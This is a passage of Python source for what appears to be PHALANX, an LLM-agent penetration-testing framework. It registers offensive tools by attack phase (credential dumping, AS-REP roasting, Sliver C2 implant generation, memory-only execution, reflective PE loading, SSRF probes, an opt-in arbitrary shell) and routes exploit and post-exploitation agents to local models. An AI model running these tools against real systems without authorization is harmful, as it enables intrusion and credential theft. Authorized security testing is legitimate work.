            "impacket_smbexec":     {"phase": "post", "mitre": ["T1021.002"], "desc": "SMB command execution"},
            "secretsdump":    {"phase": "post", "mitre": ["T1003"], "desc": "Dump credentials"},
            "getnpusers":     {"phase": "post", "mitre": ["T1558.003"], "desc": "AS-REP roasting"},
            "impacket_getnpusers": {"phase": "post", "mitre": ["T1558.003"], "desc": "AS-REP roasting"},
            "sliver_generate":      {"phase": "post", "mitre": ["T1587.001"], "desc": "Generate C2 implant"},
            "sliver_sessions":      {"phase": "post", "mitre": ["T1059"], "desc": "List C2 sessions"},
            "stealth_rce":          {"phase": "post", "mitre": ["T1059", "T1106"], "desc": "Memory‑only execution"},
            "copyright_osint":      {"phase": "osint", "mitre": ["T1592", "T1593"], "desc": "Copyright OSINT"},
            "burp_scan":            {"phase": "vuln", "mitre": ["T1190"], "desc": "Burp vulnerability scan"},
            "ghidra_analyze":       {"phase": "recon", "mitre": ["T1592"], "desc": "Binary analysis"},
            "cloud_metadata_probe": {"phase": "recon", "mitre": ["T1557"], "desc": "Cloud metadata SSRF probe"},
            "template_injection_test": {"phase": "exploit", "mitre": ["T1190"], "desc": "Template injection probe"},
            "feroxbuster":    {"phase": "recon", "mitre": ["T1595.002"], "desc": "Directory brute force"},
            "testssl":        {"phase": "recon", "mitre": ["T1595.002"], "desc": "TLS scanner"},
            "masscan":        {"phase": "recon", "mitre": ["T1046"], "desc": "Fast port scan"},
            "airodump":       {"phase": "recon", "mitre": ["T1595"], "desc": "Wi‑Fi environment scan"},
            "lavawall_wifi_scan": {"phase": "recon", "mitre": ["T1595"], "desc": "LavaWall Wi‑Fi environment scan"},
            "winstealth_load": {"phase": "exploit", "mitre": ["T1190", "T1574"], "desc": "Reflective PE loading"},
            # Reverse engineering skills
            "jadx":           {"phase": "reverse", "mitre": ["T1592"], "desc": "Decompile APK/DEX"},
            "apktool":        {"phase": "reverse", "mitre": ["T1592"], "desc": "Decode APK resources"},
            "frida":          {"phase": "reverse", "mitre": ["T1592"], "desc": "Dynamic instrumentation"},
            "ida":            {"phase": "reverse", "mitre": ["T1592"], "desc": "Binary static analysis"},
            "radare2":        {"phase": "reverse", "mitre": ["T1592"], "desc": "Binary static analysis"},
            "ollvm_deobfuscate": {"phase": "reverse", "mitre": ["T1592"], "desc": "OLLVM deobfuscation"},
            "js_reverse":     {"phase": "reverse", "mitre": ["T1592"], "desc": "JS encryption analysis"},
            # OGhidra
            "oghidra":        {"phase": "reverse", "mitre": ["T1592", "T1059"], "desc": "AI‑powered binary analysis"},
            "oghidra_chat":   {"phase": "reverse", "mitre": ["T1592"], "desc": "Conversational binary analysis"},
            # Raptor
            "raptor_round0":  {"phase": "recon", "mitre": ["T1595", "T1592"], "desc": "Raptor Round-0 deterministic front-load"},
            # Shell
            "shell":          {"phase": "orchestration", "mitre": [], "desc": "Execute arbitrary shell command (dangerous, opt-in)"},
        }
        SKILL_REGISTRY.update(skill_entries)

_init_registries()

def list_tools() -> List[Dict]:
    with _TOOL_REGISTRY_LOCK:
        return [{"name": k, "desc": v["desc"], "tags": v["tags"], "phase": SKILL_REGISTRY.get(k, {}).get("phase", "unknown")} for k, v in TOOL_REGISTRY.items()]

def get_skill_metadata(tool_name: str) -> Dict:
    with _TOOL_REGISTRY_LOCK:
        return SKILL_REGISTRY.get(tool_name, {})

def run_tool(tool_name: str, config: Optional[dict] = None, parse_output: bool = True, **kwargs) -> Dict:
    """
    Execute a tool by name with the given arguments.
    Returns a dict with 'tool', 'output', 'error', 'rc', and optionally 'parsed'.
    FIXED: Always returns a dict, never None.
    """
    with _TOOL_REGISTRY_LOCK:
        entry = TOOL_REGISTRY.get(tool_name)
    if not entry:
        return {"tool": tool_name, "output": "", "parsed": {}, "error": f"Unknown tool: {tool_name}", "rc": -1}
    
    # Check opt-in status
    if not _is_tool_opt_in_allowed(tool_name, config or {}):
        return {"tool": tool_name, "output": "", "parsed": {}, 
                "error": f"Tool '{tool_name}' requires opt-in. Set PHALANX_ALLOW_DANGEROUS=1 or config allow_dangerous=True, or for shell: PHALANX_ALLOW_SHELL=1 or config allow_shell=True", 
                "rc": -1}
    
    try:
        fn = entry["fn"]
        sig = inspect.signature(fn)
        # Ensure config is always passed as dict if the function expects it
        if "config" in sig.parameters:
            result = fn(**kwargs, config=config if config is not None else {})
        else:
            result = fn(**kwargs)
        
        # Ensure result is a dict
        if result is None:
            result = {"status": "ERROR", "error": "Tool returned None", "rc": -1}
        if not isinstance(result, dict):
            result = {"output": str(result), "error": "Unexpected non-dict return", "rc": -1}
        
        # Normalize keys
        if "output" not in result:
            result["output"] = result.get("stdout", result.get("raw_output", ""))
        if "rc" not in result:
            result["rc"] = result.get("returncode", 0 if result.get("status") == "SUCCESS" else -1)
        if "error" not in result:
            result["error"] = None if result.get("status") == "SUCCESS" else result.get("summary", "Unknown error")
        if "status" not in result:
            result["status"] = "SUCCESS" if result.get("rc", -1) == 0 else "ERROR"
        if "summary" not in result:
            result["summary"] = result.get("output", "")[:200]
        # Ensure parsed_structured exists if parser should be run
        if parse_output and "parser" in entry and entry["parser"]:
            try:
                parsed = entry["parser"](result.get("output", ""), kwargs)
                result["parsed_structured"] = parsed
            except Exception as e:
                logger.warning(f"Parser failed for {tool_name}: {e}")
                result["parsed_structured"] = {"error": str(e)}
        return result
    except TypeError as e:
        return {"tool": tool_name, "output": "", "parsed": {}, "error": f"Bad arguments: {e}", "rc": -1}
    except Exception as e:
        logger.exception(f"Tool {tool_name} execution failed")
        return {"tool": tool_name, "output": "", "parsed": {}, "error": str(e), "rc": -1}

def run_swarm_tool_batch(tool_list: List[str], target: str, config: Optional[dict] = None) -> Dict[str, Dict]:
    results = {}
    def _run_one(tool):
        try:
            return tool, run_tool(tool, config=config, target=target)
        except Exception as e:
            return tool, {"error": str(e), "rc": -1}
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {executor.submit(_run_one, tool): tool for tool in tool_list}
        for future in as_completed(futures):
            tool, res = future.result()
            results[tool] = res
    return results

# ------------------------------------------------------------------
# Lightweight RAG Tool Optimizer (embedding cache + similarity retrieval)
# ------------------------------------------------------------------
_TOOL_EMBEDDING_CACHE: Dict[str, List[float]] = {}
_EMBEDDING_CACHE_LOCK = threading.RLock()
_EMBEDDING_MODEL = "nomic-embed-text"

def _get_embedding(text: str, gateway: Optional["Gateway"] = None) -> Optional[List[float]]:
    if gateway is not None and hasattr(gateway, "get_embedding"):
        try:
            return gateway.get_embedding(text)
        except Exception as e:
            logger.warning(f"Gateway embedding failed: {e}, falling back to direct Ollama")
    ollama_url = "http://localhost:11434"
    if gateway is not None and hasattr(gateway, "ollama_url"):
        ollama_url = gateway.ollama_url
    try:
        resp = requests.post(f"{ollama_url}/api/embeddings", json={"model": _EMBEDDING_MODEL, "prompt": text}, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("embedding")
    except Exception as e:
        logger.warning(f"Direct embedding request failed: {e}")
    return None

def _cosine_similarity(a: List[float], b: List[float]) -> float:
    dot = sum(x*y for x,y in zip(a,b))
    norm_a = sum(x*x for x in a)**0.5
    norm_b = sum(y*y for y in b)**0.5
    if norm_a == 0 or norm_b == 0:
        return 0.0
    return dot / (norm_a * norm_b)

def get_relevant_tools(query: str, gateway: Optional["Gateway"] = None, top_k: int = 20) -> List[Dict]:
    """
    Retrieve relevant tools using embedding similarity, with aggressive caching.
    """
    tools = list_tools()
    if len(tools) <= top_k:
        return tools

    query_emb = _get_embedding(query, gateway)
    if query_emb is None:
        query_words = set(query.lower().split())
        scored = []
        for t in tools:
            text = (t["name"] + " " + t["desc"]).lower()
            score = sum(1 for w in query_words if w in text)
            scored.append((score, t))
        scored.sort(key=lambda x: x[0], reverse=True)
        return [t for _, t in scored[:top_k]]

    tool_texts = []
    tool_embs = []
    with _EMBEDDING_CACHE_LOCK:
        for t in tools:
            key = t["name"]
            if key in _TOOL_EMBEDDING_CACHE:
                emb = _TOOL_EMBEDDING_CACHE[key]
            else:
                text = f"{t['name']}: {t['desc']} (phase: {t.get('phase','unknown')}, tags: {', '.join(t.get('tags',[]))})"
                emb = _get_embedding(text, gateway)
                if emb:
                    _TOOL_EMBEDDING_CACHE[key] = emb
                else:
                    emb = [0.0] * len(query_emb) if query_emb else []
            if emb and len(emb) == len(query_emb):
                tool_texts.append(t)
                tool_embs.append(emb)

    if not tool_embs:
        return tools[:top_k]

    similarities = []
    for i, emb in enumerate(tool_embs):
        sim = _cosine_similarity(query_emb, emb)
        similarities.append((sim, tool_texts[i]))
    similarities.sort(key=lambda x: x[0], reverse=True)
    return [t for _, t in similarities[:top_k]]

# ------------------------------------------------------------------
# MCP Compatibility Layer (Model Context Protocol)
# ------------------------------------------------------------------
_MCP_SERVERS: Dict[str, Dict] = {}
_MCP_SERVERS_LOCK = threading.RLock()

def _make_mcp_wrapper(server_name: str, tool_name: str):
    def wrapper(**kwargs):
        return run_mcp_tool(server_name, tool_name, kwargs)
    return wrapper

def register_mcp_tool_server(server_url: str, server_name: Optional[str] = None) -> bool:
    if not server_name:
        server_name = server_url.replace("https://", "").replace("http://", "").split("/")[0]
        server_name = f"mcp_{server_name}"
    try:
        resp = requests.get(f"{server_url}/tools", timeout=10)
        if resp.status_code != 200:
            logger.error(f"MCP server {server_url} returned {resp.status_code}")
            return False
        data = resp.json()
        tools = data.get("tools", [])
        if not tools:
            logger.warning(f"No tools found at {server_url}/tools")
            return False

        with _MCP_SERVERS_LOCK:
            _MCP_SERVERS[server_name] = {"url": server_url, "tools": tools}

        with _TOOL_REGISTRY_LOCK:
            for tool in tools:
                tool_full_name = f"{server_name}__{tool['name']}"
                if tool_full_name in TOOL_REGISTRY:
                    logger.warning(f"Tool {tool_full_name} already exists, overwriting")
                TOOL_REGISTRY[tool_full_name] = {
                    "fn": _make_mcp_wrapper(server_name, tool['name']),
                    "desc": tool.get("description", f"MCP tool from {server_name}"),
                    "tags": ["mcp"],
                    "parser": None,
                }
                SKILL_REGISTRY[tool_full_name] = {"phase": "mcp", "mitre": [], "desc": tool.get("description", "")}
        logger.info(f"Registered {len(tools)} MCP tools from {server_name}")
        return True
    except Exception as e:
        logger.error(f"Failed to register MCP server {server_url}: {e}")
        return False

def run_mcp_tool(server_name: str, tool_name: str, params: Dict) -> Dict:
    with _MCP_SERVERS_LOCK:
        server = _MCP_SERVERS.get(server_name)
    if not server:
        return {"output": "", "error": f"MCP server '{server_name}' not registered", "rc": -1}
    url = server["url"]
    try:
        resp = requests.post(f"{url}/call", json={"tool": tool_name, "params": params}, timeout=60)
        if resp.status_code == 200:
            result = resp.json()
            output = result.get("output", result.get("result", result.get("stdout", "")))
            error = result.get("error")
            rc = result.get("rc", 0)
            return {"output": output, "error": error, "rc": rc}
        else:
            return {"output": "", "error": f"MCP server returned {resp.status_code}: {resp.text}", "rc": -1}
    except Exception as e:
        return {"output": "", "error": f"MCP execution failed: {e}", "rc": -1}

# ------------------------------------------------------------------
# Gateway – unified interface for LLM and tool execution with model routing
# ------------------------------------------------------------------
class Gateway:
    PROFILES = {
        "eco": {"orchestrator": "qwen2.5:7b", "planner": "qwen2.5:7b", "recon": "qwen2.5:1.5b",
                "exploit": "qwen2.5:7b", "post_exploit": "qwen2.5:7b"},
        "max": {"orchestrator": "llama3:70b", "planner": "llama3:70b", "recon": "llama3:70b",
                "exploit": "llama3:70b", "post_exploit": "llama3:70b"},
        "test": {"orchestrator": "qwen2.5:1.5b", "planner": "qwen2.5:1.5b", "recon": "qwen2.5:1.5b",
                 "exploit": "qwen2.5:1.5b", "post_exploit": "qwen2.5:1.5b"},
    }

    def __init__(self, config: dict, registry: Dict[str, Callable] = None):
        self.config = config
        self.registry = registry or TOOL_REGISTRY
        oc = config.get("ollama", {})
        self.ollama_url = oc.get("url", "http://localhost:11434")
        self.default_model = oc.get("default_model", "qwen2.5:7b")
        self.fast_model = oc.get("fast_model", "qwen2.5:1.5b")
        self.reasoning_model = oc.get("reasoning_model", self.default_model)
        self.temperature = oc.get("temperature", 0.1)
        self.timeout = oc.get("timeout", 120)
        self.current_profile = "test"
        self.current_personality = "concise"
        self.personality_prompts = {
            "concise": "Be brief and direct. Max 3 sentences.",
            "detailed": "Provide detailed step‑by‑step explanations.",
            "code": "Focus on working code and technical accuracy.",
            "pentest": "You are a penetration tester. Give technical offensive security answers."
        }
        set_global_config(config)

        mcp_cfg = config.get("mcp", {})
        if mcp_cfg.get("enabled", False):
            for server in mcp_cfg.get("servers", []):
                name = server.get("name")
                url = server.get("url")
                if name and url:
                    register_mcp_tool_server(url, server_name=name)
                    logger.info(f"Auto-registered MCP server '{name}' from config")

    def get_model_for_task(self, task_type: str) -> str:
        if task_type == "reason":
            return self.reasoning_model
        elif task_type == "parse":
            return self.fast_model
        else:
            return self.default_model

    def get_ollama_models(self) -> List[str]:
        try:
            result = subprocess.run(["ollama", "list", "--json"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                data = json.loads(result.stdout)
                return [m["name"] for m in data.get("models", [])]
            else:
                result = subprocess.run(["ollama", "list"], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    lines = result.stdout.strip().splitlines()
                    if len(lines) > 1:
                        models = []
                        for line in lines[1:]:
                            parts = line.split()
                            if parts:
                                models.append(parts[0])
                        return models
        except Exception as e:
            logger.warning(f"Failed to list Ollama models: {e}")
        return []

    def pull_ollama_model(self, model: str) -> bool:
        try:
            # Increased timeout to 600 seconds for large models
            subprocess.run(["ollama", "pull", model], check=True, timeout=600)
            return True
        except Exception as e:
            logger.error(f"Failed to pull model {model}: {e}")
            return False

    def get_model_for_agent(self, agent_name: str) -> str:
        profile = self.PROFILES.get(self.current_profile, self.PROFILES.get("test", {}))
        return profile.get(agent_name, self.default_model)

    def set_profile(self, name: str):
        if name in self.PROFILES:
            self.current_profile = name
        else:
            logger.warning(f"Profile '{name}' not found, keeping '{self.current_profile}'")

    def set_model(self, model: str):
        self.default_model = model

    def set_personality(self, personality: str):
        if personality in self.personality_prompts:
            self.current_personality = personality

    def check_ollama(self) -> bool:
        try:
            r = requests.get(f"{self.ollama_url}/api/tags", timeout=3)
            return r.status_code == 200
        except:
            return False

    def list_models(self) -> List[str]:
        try:
            r = requests.get(f"{self.ollama_url}/api/tags", timeout=5)
            if r.status_code == 200:
                return [m["name"] for m in r.json().get("models", [])]
        except:
            pass
        return [self.default_model]

    def stream_generate(self, prompt: str, model=None, system=None) -> Iterator[Dict]:
        model = model or self.default_model
        personality = self.personality_prompts.get(self.current_personality, "")
        full_system = " ".join(filter(None, [system or "You are a helpful AI assistant.", personality]))
        payload = {"model": model, "prompt": prompt, "system": full_system, "stream": True, "options": {"temperature": self.temperature}}
        try:
            with requests.post(f"{self.ollama_url}/api/generate", json=payload, stream=True, timeout=self.timeout) as r:
                for line in r.iter_lines():
                    if line:
                        try:
                            data = json.loads(line)
                            yield data
                            if data.get("done"):
                                break
                        except:
                            pass
        except Exception as e:
            yield {"response": f"[Gateway error: {e}]", "done": True}

    def chat(self, messages: List[Dict], model=None, json_mode=False, retries=2) -> str:
        model = model or self.default_model
        personality = self.personality_prompts.get(self.current_personality, "")
        system_present = any(m.get("role") == "system" for m in messages)
        if not system_present and personality:
            messages.insert(0, {"role": "system", "content": personality})
        payload = {"model": model, "messages": messages, "stream": False, "options": {"temperature": self.temperature}}
        if json_mode:
            payload["format"] = "json"
        for attempt in range(retries):
            try:
                r = requests.post(f"{self.ollama_url}/api/chat", json=payload, timeout=self.timeout)
                if r.status_code == 200:
                    content = r.json()["message"]["content"]
                    if json_mode:
                        # Robust extraction of JSON from markdown code fences
                        # Remove leading/trailing whitespace
                        content = content.strip()
                        # Pattern to match ```json ... ``` or ``` ... ```
                        fence_pattern = re.compile(r'^```(?:json)?\s*\n?(.*?)\n?```$', re.DOTALL)
                        match = fence_pattern.match(content)
                        if match:
                            content = match.group(1).strip()
                        # If still has leading/trailing backticks, remove them manually
                        if content.startswith("```") and content.endswith("```"):
                            content = content[3:-3].strip()
                            if content.startswith("json"):
                                content = content[4:].strip()
                        # Validate JSON
                        json.loads(content)
                    return content
                else:
                    if attempt == retries-1:
                        return f"[Error: Ollama HTTP {r.status_code}]"
            except Exception as e:
                if attempt == retries-1:
                    return f"[Gateway error: {e}]"
            time.sleep(1)
        return "[Gateway error: max retries exceeded]"

    def generate(self, prompt: str, model=None, system=None, json_mode=False) -> str:
        messages = []
        if system:
            messages.append({"role": "system", "content": system})
        messages.append({"role": "user", "content": prompt})
        return self.chat(messages, model=model, json_mode=json_mode)

    async def generate_async(self, prompt: str, model=None, system=None, json_mode=False) -> str:
        """Async version of generate() using asyncio.to_thread."""
        import asyncio
        return await asyncio.to_thread(
            self.generate, prompt, model, system, json_mode
        )

    # ------------------------------------------------------------------
    # get_embedding method for embedding retrieval (used by RAG optimizer)
    # ------------------------------------------------------------------
    def get_embedding(self, text: str) -> Optional[List[float]]:
        """Get embedding vector for text using configured embedding model."""
        try:
            embedding_model = self.config.get("ollama", {}).get("embedding_model", "nomic-embed-text")
            resp = requests.post(
                f"{self.ollama_url}/api/embeddings",
                json={"model": embedding_model, "prompt": text},
                timeout=10
            )
            if resp.status_code == 200:
                return resp.json().get("embedding")
        except Exception as e:
            logger.warning(f"Embedding request failed: {e}")
        return None

    def run_tool(self, tool_name: str, params: Dict, parse_output: bool = True) -> Dict:
        """
        Execute a tool via the registry with proper dict handling.
        FIXED: Always returns a dict, never None.
        """
        if tool_name not in self.registry:
            return {"error": f"Unknown tool: {tool_name}", "status": "ERROR", "rc": -1}
        
        # Check opt-in status
        if not _is_tool_opt_in_allowed(tool_name, self.config):
            return {"error": f"Tool '{tool_name}' requires opt-in. Set PHALANX_ALLOW_DANGEROUS=1 or config allow_dangerous=True, or for shell: PHALANX_ALLOW_SHELL=1 or config allow_shell=True", 
                    "status": "ERROR", "rc": -1}
        
        logger.info(f"Running tool: {tool_name} with params {params}")
        try:
            # Check if the function expects a config parameter
            entry = self.registry[tool_name]
            fn = entry["fn"]
            sig = inspect.signature(fn)
            if "config" in sig.parameters:
                result = fn(**params, config=self.config)
            else:
                result = fn(**params)
            # Ensure result is a dict
            if result is None:
                result = {"status": "ERROR", "error": "Tool returned None", "rc": -1}
            if not isinstance(result, dict):
                result = {"output": str(result), "error": "Unexpected non-dict return", "rc": -1}
            
            # Normalize keys
            if "output" not in result:
                result["output"] = result.get("stdout", result.get("raw_output", ""))
            if "rc" not in result:
                result["rc"] = result.get("returncode", 0 if result.get("status") == "SUCCESS" else -1)
            if "error" not in result:
                result["error"] = None if result.get("status") == "SUCCESS" else result.get("summary", "Unknown error")
            if "status" not in result:
                result["status"] = "SUCCESS" if result.get("rc", -1) == 0 else "ERROR"
            if "summary" not in result:
                result["summary"] = result.get("output", "")[:200]
            
            if parse_output and "parser" in entry and entry["parser"]:
                try:
                    parsed = entry["parser"](result.get("output", ""), params)
                    result["parsed_structured"] = parsed
                except Exception as e:
                    logger.warning(f"Parser failed for {tool_name}: {e}")
                    result["parsed_structured"] = {"error": str(e)}
            return result
        except Exception as e:
            logger.exception(f"Tool {tool_name} failed")
            return {"error": str(e), "rc": -1, "status": "ERROR", "summary": str(e)}

    def get_tool_list_for_llm(self) -> str:
        tools = list_tools()
        if len(tools) > 80:
            phases = {}
            for t in tools:
                phase = t.get("phase", "unknown")
                if phase not in phases:
                    phases[phase] = []
                phases[phase].append(t["name"])
            lines = []
            for phase, names in phases.items():
                lines.append(f"### {phase.upper()} phase: {', '.join(names[:20])}" + (" ..." if len(names) > 20 else ""))
            return "\n".join(lines)
        else:
            lines = []
            for t in tools:
                lines.append(f"- {t['name']}: {t['desc']} (phase: {t.get('phase', 'unknown')})")
            return "\n".join(lines)

    def get_relevant_tools(self, query: str, top_k: int = 20) -> str:
        relevant = get_relevant_tools(query, gateway=self, top_k=top_k)
        lines = []
        for t in relevant:
            lines.append(f"- {t['name']}: {t['desc']} (phase: {t.get('phase', 'unknown')})")
        return "\n".join(lines)

    def get_mitre_technique(self, technique_id: str) -> str:
        cache = {
            "T1190": "Exploit Public-Facing Application",
            "T1046": "Network Service Scanning",
            "T1595": "Active Scanning",
        }
        return cache.get(technique_id.upper(), "Unknown technique")

def get_llm_gateway(config: dict):
    try:
        agents_dir = Path.cwd() / "phalanx" / "agents"
        if agents_dir.exists() and str(agents_dir) not in sys.path:
            sys.path.insert(0, str(agents_dir))
        from llm_gateway import OllamaGateway
        return OllamaGateway(config)
    except ImportError:
        logger.warning("OllamaGateway not found – using fallback Gateway")
        return Gateway(config, TOOL_REGISTRY)

def run_tool_sandboxed(tool_name: str, config: dict, **kwargs) -> Dict:
    return run_tool(tool_name, config=config, **kwargs)

def get_tool_list_for_llm() -> str:
    return Gateway({}, TOOL_REGISTRY).get_tool_list_for_llm()

if __name__ == "__main__":
    print("PHALANX Tools v3.6.2 ready (T3MP3ST + OGhidra + Raptor + Shell enhancements).")
    print("Available tools:", [t["name"] for t in list_tools()])
    cfg = {"sandbox": {"enabled": False}}
    res = run_nmap("localhost", config=cfg)
    print(f"nmap test: rc={res['rc']}")